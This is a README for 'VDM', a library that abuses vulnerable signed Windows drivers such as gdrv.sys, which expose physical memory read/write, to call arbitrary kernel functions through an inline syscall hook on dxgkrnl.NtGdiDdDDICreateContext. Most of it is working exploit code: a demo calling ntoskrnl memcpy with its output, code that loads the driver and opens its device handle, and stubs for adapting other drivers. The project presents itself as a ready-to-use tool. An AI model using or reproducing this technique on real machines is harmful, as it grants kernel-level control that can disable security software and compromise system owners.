<div align="center">
    <div>
        <img src="https://imgur.com/7ipSZRN.png"/>
    </div>
</div>

# Vulnerable Driver Manipulation

A library to manipulate drivers exposing a physical memory read/write primitive to allow the user to call any function in the kernel. There are thousands of drivers exposing physical
memory read/write, a bunch are listed in this repo. Currently the project is using gdrv.sys, and is inline hooking `dxgkrnl.NtGdiDdDDICreateContext`.

# Example

In this example VDM syscalls into an inline hook placed on `dxgkrnl.NtGdiDdDDICreateContext` to call memcpy exported from ntoskrnl.exe.

#### Demo Code
```cpp
vdm::vdm_ctx vdm;
const auto ntoskrnl_base =
reinterpret_cast<void*>(
    util::get_module_base("ntoskrnl.exe"));

const auto ntoskrnl_memcpy =
    util::get_kernel_export("ntoskrnl.exe", "memcpy");

std::printf("[+] drv_handle -> 0x%x, drv_key -> %s\n", drv_handle, drv_key.c_str());
std::printf("[+] %s physical address -> 0x%p\n", vdm::syscall_hook.first, vdm::syscall_address.load());
std::printf("[+] ntoskrnl base address -> 0x%p\n", ntoskrnl_base);
std::printf("[+] ntoskrnl memcpy address -> 0x%p\n", ntoskrnl_memcpy);

short mz_bytes = 0;
vdm.syscall<decltype(&memcpy)>(
	ntoskrnl_memcpy,
	&mz_bytes,
	ntoskrnl_base,
	sizeof mz_bytes
);
std::printf("[+] kernel MZ -> 0x%x\n", mz_bytes);
```

#### Demo Code Result
```
[+] drv_handle -> 0xb0, drv_key -> frAQBc8Wsa1xVPfv
[+] NtGdiDdDDICreateContext physical address -> 0x0000000100ACA5F0
[+] ntoskrnl base address -> 0xFFFFF80075200000
[+] ntoskrnl memcpy address -> 0xFFFFF800755F0980
[+] kernel MZ -> 0x5a4d
[+] press any key to close...
```

# Usage

Currently the project is configured to use gdrv, but if you want to swap the driver out you must defined four functions. You can also change which syscall you want to 
hook by changing this variable inside of `vdm_ctx/vdm_ctx.h`.

```cpp
// change this to whatever you want :^)
constexpr std::pair<const char*, const char*> syscall_hook = { "NtGdiDdDDICreateContext", "win32u.dll" };
```

### vdm::load_drv

Replace this function with the code required to load your driver... Return an std::pair containing the driver handle and an std::string containing the registry key name
for the driver. The key name is returned from [loadup](https://githacks.org/xerox/loadup).

```cpp
__forceinline auto load_drv() -> std::pair <HANDLE, std::string>
{
	const auto [result, key] =
	    driver::load(
		vdm::raw_driver,
		sizeof(vdm::raw_driver)
	    );

	if (!result) return { {}, {} };
	vdm::drv_handle = CreateFile(
		"\\\\.\\GIO",
		GENERIC_READ | GENERIC_WRITE,
		NULL,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	return { vdm::drv_handle, key };
}
```

### vdm::unload_drv

This code probably wont change, its just a wrapper function for `driver::unload`, but it also closes the driver handle before trying to unload the driver...

```cpp
__forceinline bool unload_drv(HANDLE drv_handle, std::string drv_key)
{
    return CloseHandle(drv_handle) && driver::unload(drv_key);
}
```

### vdm::read_phys

Most drivers expose mapping of physical memory. This means you will need to map the physical memory, memcpy it, then unmap it. This allows support
for drivers that actually only offer physical read and write and not physical map/unmap.

```cpp
__forceinline bool read_phys(void* addr, void* buffer, std::size_t size)
{
    // code to read physical memory. most drivers offer map/unmap physical
    // so you will need to map the physical memory, memcpy, then unmap the memory
}
```

### vdm::write_phys

This function is going to probably contain the same code as `vdm::read_phys` except the memcpy dest and src swapped...

```cpp
__forceinline bool write_phys(void* addr, void* buffer, std::size_t size)
{
    // code to write physical memory... same code as vdm::read_phys
    // except memcpy dest and src are swapped.
}
```